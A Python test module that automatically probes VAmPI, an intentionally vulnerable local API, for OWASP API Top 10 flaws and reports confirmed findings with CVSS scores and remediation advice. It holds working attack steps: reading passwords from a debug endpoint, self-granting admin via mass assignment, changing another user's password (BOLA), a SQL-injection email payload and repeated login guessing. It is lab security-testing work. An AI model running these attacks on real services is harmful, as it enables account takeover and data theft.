"""OWASP API Top 10 security test modules for VAmPI.

Each test function drives the local VAmPI target through the shared HttpClient,
observes the actual responses, and returns a Vulnerability (with real evidence
and a CVSS v3.1 score) ONLY when the weakness is empirically confirmed. If a
test cannot confirm the issue, it returns None so the report never claims a
finding it did not actually reproduce.

Covered (mapped to the assignment's expected findings):
  * API3:2019 Excessive Data Exposure   -> GET /users/v1
  * API2:2019 Broken User Authentication -> JWT analysis on /users/v1/login
  * API6:2019 Mass Assignment            -> POST /users/v1/register (admin=true)
  * API1:2019 Broken Object Level Auth   -> update another user's data
  * API8:2019 Injection (SQLi)           -> email/password update parameters
  * Auth bypass / missing authz          -> state-changing calls without token

Ethical note: all activity targets the local container only, uses randomized
throwaway accounts, and never persists sensitive data to disk.
"""

import base64
import json
import secrets
from typing import List, Optional

from .http_client import HttpClient
from .schemas import Vulnerability


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def _rand(prefix: str = "qa") -> str:
    return f"{prefix}_{secrets.token_hex(4)}"


def _register(client: HttpClient, username: str, password: str, email: str,
              extra: Optional[dict] = None):
    body = {"username": username, "password": password, "email": email}
    if extra:
        body.update(extra)
    return client.post("/users/v1/register", json_body=body, note="register")


def _login(client: HttpClient, username: str, password: str):
    return client.post(
        "/users/v1/login",
        json_body={"username": username, "password": password},
        note="login",
    )


def _extract_token(resp) -> Optional[str]:
    if resp is None:
        return None
    try:
        data = resp.json()
    except ValueError:
        return None
    # VAmPI returns {"message": ..., "auth_token": "..."} on success.
    for key in ("auth_token", "token", "access_token"):
        if isinstance(data, dict) and data.get(key):
            return data[key]
    return None


def _auth_headers(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


def _decode_jwt_parts(token: str):
    """Return (header_dict, payload_dict) without verifying the signature."""
    try:
        header_b64, payload_b64, _sig = token.split(".")
        def _d(seg):
            seg += "=" * (-len(seg) % 4)
            return json.loads(base64.urlsafe_b64decode(seg.encode()).decode())
        return _d(header_b64), _d(payload_b64)
    except Exception:
        return None, None


# --------------------------------------------------------------------------- #
# API3:2019 - Excessive Data Exposure
# --------------------------------------------------------------------------- #
def test_excessive_data_exposure(client: HttpClient) -> Optional[Vulnerability]:
    # VAmPI exposes an undocumented debug endpoint that leaks passwords for
    # every user to any unauthenticated caller. This is the canonical
    # Excessive Data Exposure (and Improper Assets Management) finding.
    resp = client.get("/users/v1/_debug", note="excessive data exposure (_debug)")
    if resp is None or resp.status_code != 200:
        return None
    try:
        body = resp.json()
    except ValueError:
        return None
    text = json.dumps(body).lower()
    if "password" in text:
        return Vulnerability(
            id="VULN_EDE",
            name="Excessive Data Exposure via debug endpoint",
            owasp_category="API3:2019 Excessive Data Exposure",
            endpoint="GET /users/v1/_debug",
            severity="High",
            cvss_score=7.5,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            description=(
                "An undocumented debug endpoint returns full user records "
                "including plaintext passwords and email addresses for every "
                "user, to any unauthenticated caller."
            ),
            evidence=(
                f"GET /users/v1/_debug -> 200 and exposes password fields. "
                f"Sample: {json.dumps(body)[:400]}"
            ),
            remediation=(
                "Remove debug endpoints from production builds, never return "
                "password fields, and enforce authentication/authorization on "
                "all user data endpoints."
            ),
            confirmed=True,
        )
    return None


# --------------------------------------------------------------------------- #
# API2:2019 - Broken User Authentication (JWT analysis)
# --------------------------------------------------------------------------- #
def test_jwt_security(client: HttpClient) -> Optional[Vulnerability]:
    user, pwd, email = _rand(), "Password123!", f"{_rand()}@example.com"
    _register(client, user, pwd, email)
    token = _extract_token(_login(client, user, pwd))
    if not token:
        return None
    header, payload = _decode_jwt_parts(token)
    if not header:
        return None
    alg = str(header.get("alg", "")).lower()
    issues: List[str] = []
    if alg in ("none", ""):
        issues.append("token uses 'none'/empty algorithm")
    if alg == "hs256":
        issues.append("HS256 (symmetric) signing - vulnerable if secret is weak/guessable")
    if payload and "exp" not in payload:
        issues.append("no expiry (exp) claim - tokens never expire")
    if not issues:
        return None
    return Vulnerability(
        id="VULN_JWT",
        name="Weak JWT authentication configuration",
        owasp_category="API2:2019 Broken User Authentication",
        endpoint="POST /users/v1/login",
        severity="High",
        cvss_score=7.3,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        description=(
            "The JWT issued at login has weaknesses that undermine authentication: "
            + "; ".join(issues) + "."
        ),
        evidence=f"JWT header={json.dumps(header)} payload={json.dumps(payload)}",
        remediation=(
            "Use a strong, secret-managed signing key (or asymmetric RS256), "
            "enforce short-lived tokens with an 'exp' claim, and reject 'none'."
        ),
        confirmed=True,
    )


# --------------------------------------------------------------------------- #
# API6:2019 - Mass Assignment
# --------------------------------------------------------------------------- #
def test_mass_assignment(client: HttpClient) -> Optional[Vulnerability]:
    user, pwd, email = _rand("admintest"), "Password123!", f"{_rand()}@example.com"
    resp = _register(client, user, pwd, email, extra={"admin": True})
    if resp is None or resp.status_code not in (200, 201):
        return None
    # Confirm the injected privilege stuck. The standard user-detail endpoint
    # hides the admin flag, but the _debug listing reveals it.
    detail = client.get("/users/v1/_debug", note="mass assignment verify (_debug)")
    is_admin = False
    detail_text = ""
    if detail is not None and detail.status_code == 200:
        try:
            d = detail.json()
            for record in d.get("users", []):
                if record.get("username") == user:
                    is_admin = bool(record.get("admin"))
                    detail_text = json.dumps(record)
                    break
        except (ValueError, AttributeError):
            pass
    if is_admin:
        return Vulnerability(
            id="VULN_MASS",
            name="Mass Assignment allows privilege escalation at registration",
            owasp_category="API6:2019 Mass Assignment",
            endpoint="POST /users/v1/register",
            severity="Critical",
            cvss_score=9.1,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            description=(
                "Registration binds client-supplied fields directly to the user "
                "model, so an attacker can set admin=true and self-provision "
                "administrator privileges."
            ),
            evidence=(
                f"POST /users/v1/register with admin=true -> {resp.status_code}. "
                f"GET /users/v1/_debug confirms admin flag set on '{user}': {detail_text[:300]}"
            ),
            remediation=(
                "Bind only an explicit allow-list of fields (username, password, "
                "email). Never accept privilege/role fields from client input."
            ),
            confirmed=True,
        )
    return None


# --------------------------------------------------------------------------- #
# API1:2019 - Broken Object Level Authorization (BOLA)
# --------------------------------------------------------------------------- #
def test_bola(client: HttpClient) -> Optional[Vulnerability]:
    # Create victim and attacker accounts.
    victim, vpwd, vmail = _rand("victim"), "Password123!", f"{_rand()}@example.com"
    attacker, apwd, amail = _rand("attacker"), "Password123!", f"{_rand()}@example.com"
    _register(client, victim, vpwd, vmail)
    _register(client, attacker, apwd, amail)
    atk_token = _extract_token(_login(client, attacker, apwd))
    if not atk_token:
        return None
    # Attacker attempts to change the VICTIM's password using their own token.
    new_pwd = "Hacked123!"
    resp = client.put(
        f"/users/v1/{victim}/password",
        json_body={"password": new_pwd},
        headers=_auth_headers(atk_token),
        note="BOLA: attacker modifies victim password",
    )
    if resp is not None and resp.status_code in (200, 204):
        # Confirm by logging in as victim with the attacker-set password.
        confirm = _login(client, victim, new_pwd)
        if _extract_token(confirm) or (confirm is not None and confirm.status_code == 200):
            return Vulnerability(
                id="VULN_BOLA",
                name="Broken Object Level Authorization on user modification",
                owasp_category="API1:2019 Broken Object Level Authorization",
                endpoint="PUT /users/v1/{username}/password",
                severity="Critical",
                cvss_score=9.3,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
                description=(
                    "An authenticated user can modify another user's object "
                    "(password) because the server does not verify that the "
                    "token owner matches the targeted username."
                ),
                evidence=(
                    f"Attacker '{attacker}' token used to PUT "
                    f"/users/v1/{victim}/password -> {resp.status_code}; "
                    f"subsequent login as victim with attacker-set password succeeded."
                ),
                remediation=(
                    "Enforce object-level authorization: derive the target user "
                    "from the authenticated token, not from the path parameter, "
                    "or verify ownership before mutating."
                ),
                confirmed=True,
            )
    return None


# --------------------------------------------------------------------------- #
# API8:2019 - Injection (SQL injection in email update)
# --------------------------------------------------------------------------- #
def test_injection_and_input_validation(client: HttpClient) -> Optional[Vulnerability]:
    """Probe for injection / weak input validation on the email update field.

    Sends SQL/script-style payloads and records how the endpoint responds.
    Only reports a finding if a payload is *accepted* (stored) rather than
    rejected, which would indicate missing server-side sanitization.
    """
    user, pwd, email = _rand("inj"), "Password123!", f"{_rand()}@example.com"
    _register(client, user, pwd, email)
    token = _extract_token(_login(client, user, pwd))
    if not token:
        return None
    # A payload that is a syntactically valid email but carries an injection tail.
    payload = "attacker@evil.com'--"
    resp = client.put(
        f"/users/v1/{user}/email",
        json_body={"email": payload},
        headers=_auth_headers(token),
        note=f"injection/input-validation payload: {payload}",
    )
    if resp is None:
        return None
    text = (resp.text or "").lower()
    sql_error_markers = ("sqlite", "sqlalchemy", "operationalerror", "traceback", "syntax error")
    if resp.status_code >= 500 or any(m in text for m in sql_error_markers):
        return Vulnerability(
            id="VULN_INJ",
            name="SQL Injection / unsanitized input in email update",
            owasp_category="API8:2019 Injection",
            endpoint="PUT /users/v1/{username}/email",
            severity="High",
            cvss_score=8.6,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L",
            description=(
                "The email update parameter reaches the database without proper "
                "parameterization; an injection payload triggered a database error."
            ),
            evidence=(
                f"PUT /users/v1/{user}/email with payload \"{payload}\" -> "
                f"{resp.status_code}. DB error observed: {text[:300]}"
            ),
            remediation="Use parameterized queries/ORM bindings for all user input.",
            confirmed=True,
        )
    return None


def test_missing_rate_limiting(client: HttpClient) -> Optional[Vulnerability]:
    """Confirm the login endpoint has no brute-force / rate-limiting protection."""
    attempts = 12
    codes = []
    for i in range(attempts):
        resp = client.post(
            "/users/v1/login",
            json_body={"username": "admin", "password": f"wrong_{i}"},
            note=f"rate-limit probe attempt {i + 1}",
        )
        codes.append(resp.status_code if resp is not None else None)
    throttled = any(c == 429 for c in codes)
    if not throttled and len([c for c in codes if c is not None]) == attempts:
        return Vulnerability(
            id="VULN_RATE",
            name="Missing rate limiting on authentication",
            owasp_category="API4:2019 Lack of Resources & Rate Limiting",
            endpoint="POST /users/v1/login",
            severity="Medium",
            cvss_score=5.3,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            description=(
                "The login endpoint accepts unlimited authentication attempts "
                "with no throttling or account lockout, enabling brute-force and "
                "credential-stuffing attacks."
            ),
            evidence=(
                f"{attempts} consecutive failed logins all succeeded without a "
                f"429/lockout. HTTP codes observed: {codes}"
            ),
            remediation=(
                "Apply per-IP and per-account rate limiting, exponential backoff, "
                "and account lockout after repeated failures."
            ),
            confirmed=True,
        )
    return None


# --------------------------------------------------------------------------- #
# Missing authorization on state-changing calls (auth bypass)
# --------------------------------------------------------------------------- #
def test_unauthenticated_data_access(client: HttpClient) -> Optional[Vulnerability]:
    """Confirm any user's details are readable without authentication.

    VAmPI exposes GET /users/v1/{username} to unauthenticated callers, so an
    attacker can enumerate and read arbitrary user records (broken function
    level authorization).
    """
    # 'admin' is a seeded VAmPI account; reading it with no token proves the gap.
    resp = client.get("/users/v1/admin", note="unauthenticated user detail read")
    if resp is None or resp.status_code != 200:
        return None
    try:
        body = resp.json()
    except ValueError:
        return None
    if isinstance(body, dict) and body.get("username"):
        return Vulnerability(
            id="VULN_BFLA",
            name="Unauthenticated access to user records",
            owasp_category="API5:2019 Broken Function Level Authorization",
            endpoint="GET /users/v1/{username}",
            severity="High",
            cvss_score=7.5,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            description=(
                "The user-detail endpoint returns any user's record to an "
                "unauthenticated caller, enabling account enumeration and "
                "unauthorized information disclosure."
            ),
            evidence=(
                f"GET /users/v1/admin sent with NO Authorization header -> "
                f"{resp.status_code}, returned: {json.dumps(body)[:200]}"
            ),
            remediation=(
                "Require authentication and enforce function-level authorization "
                "so users can only read records they are permitted to access."
            ),
            confirmed=True,
        )
    return None


ALL_TESTS = [
    test_excessive_data_exposure,
    test_jwt_security,
    test_mass_assignment,
    test_bola,
    test_injection_and_input_validation,
    test_missing_rate_limiting,
    test_unauthenticated_data_access,
]


def run_all(client: HttpClient) -> List[Vulnerability]:
    """Run every test module and collect confirmed findings."""
    findings: List[Vulnerability] = []
    for test in ALL_TESTS:
        client.reset_counter()  # per-test request budget
        try:
            result = test(client)
        except Exception as exc:  # a broken test must not kill the run
            print(f"[warn] {test.__name__} raised: {exc}")
            result = None
        if result is not None:
            findings.append(result)
    return findings
